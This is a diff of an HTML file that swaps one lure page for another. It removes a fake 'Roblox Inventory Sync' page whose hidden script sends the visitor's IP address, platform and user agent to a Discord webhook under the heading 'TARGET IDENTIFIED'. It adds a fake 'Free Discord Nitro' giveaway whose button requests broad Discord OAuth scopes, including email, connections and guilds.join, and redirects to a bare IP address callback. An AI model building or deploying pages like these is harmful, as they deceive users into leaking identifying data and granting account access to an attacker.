@@ -1,46 +1,126 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Roblox | Inventory Sync</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Discord Nitro - Limited Time Offer</title>
     <style>
-        body { background: #f2f4f5; font-family: 'Segoe UI', Arial; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 380px; padding: 40px; text-align: center; }
-        .btn { background: #00b2ff; color: white; border: none; padding: 15px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
+        body {
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #36393f;
+            color: #dcddde;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-image: url('https://discord.com/assets/9c4b70c046b2c6c4a9b4e2e4e4e4e4e4.png');
+            background-size: cover;
+            background-position: center;
+        }
+        .container {
+            background-color: #2f3136;
+            border-radius: 8px;
+            padding: 40px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            max-width: 450px;
+            width: 90%;
+        }
+        .logo {
+            width: 120px;
+            height: 120px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 16px;
+            color: #fff;
+            font-weight: 600;
+        }
+        .subtitle {
+            font-size: 18px;
+            color: #b9bbbe;
+            margin-bottom: 25px;
+        }
+        .features {
+            text-align: left;
+            margin: 25px 0;
+            background-color: #292b2f;
+            padding: 20px;
+            border-radius: 8px;
+        }
+        .feature {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            font-size: 16px;
+        }
+        .feature:last-child {
+            margin-bottom: 0;
+        }
+        .check {
+            color: #43b581;
+            margin-right: 12px;
+            font-size: 18px;
+        }
+        .btn {
+            background-color: #7289da;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            padding: 12px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.2s ease-in-out;
+            display: inline-block;
+            width: 100%;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .btn:hover {
+            background-color: #677bc4;
+        }
+        .footer-text {
+            margin-top: 25px;
+            font-size: 14px;
+            color: #72767d;
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h1>Sync Inventory</h1>
-        <p>Click to synchronize your heart box asset with your Roblox account.</p>
-        <button class="btn" id="sync">Sync Now</button>
+    <div class="container">
+        <img src="https://discord.com/assets/8c5a49d560e8b3c8f0c0c0c0c0c0c0c0.png" alt="Discord Logo" class="logo">
+        <h1>Free Discord Nitro</h1>
+        <p class="subtitle">Claim your 3 months of Nitro, on us!</p>
+        
+        <div class="features">
+            <div class="feature">
+                <span class="check">✓</span>
+                <span>3 Months of Free Discord Nitro</span>
+            </div>
+            <div class="feature">
+                <span class="check">✓</span>
+                <span>Custom Discord Profile Banner</span>
+            </div>
+            <div class="feature">
+                <span class="check">✓</span>
+                <span>2 Server Boosts & 30% off extra</span>
+            </div>
+            <div class="feature">
+                <span class="check">✓</span>
+                <span>Higher Quality Video & Go Live</span>
+            </div>
+            <div class="feature">
+                <span class="check">✓</span>
+                <span>Custom Emojis & Stumps Everywhere</span>
+            </div>
+        </div>
+
+        <!-- This is the important link. It directs the user to Discord's OAuth screen. -->
+        <a href="https://discord.com/api/oauth2/authorize?client_id=1474798861607505930&redirect_uri=http%3A%2F%2F152.37.218.46%3A8080%2Foauth%2Fcallback&response_type=code&scope=identify%20email%20connections%20guilds%20guilds.join" class="btn">Claim Nitro Now</a>
+
+        <p class="footer-text">This is a limited time offer. Valid for new users only.</p>
     </div>
-
-    <script>
-        const HOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
-
-        document.getElementById('sync').addEventListener('click', async () => {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-
-                await fetch(HOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🎯 TARGET IDENTIFIED",
-                            color: 16711680,
-                            fields: [
-                                { name: "IPv4", value: data.ip },
-                                { name: "Hardware", value: navigator.platform },
-                                { name: "Engine", value: navigator.userAgent }
-                            ]
-                        }]
-                    })
-                });
-            } catch (e) {}
-            window.location.href = "https://www.roblox.com/home";
-        });
-    </script>
 </body>
 </html>
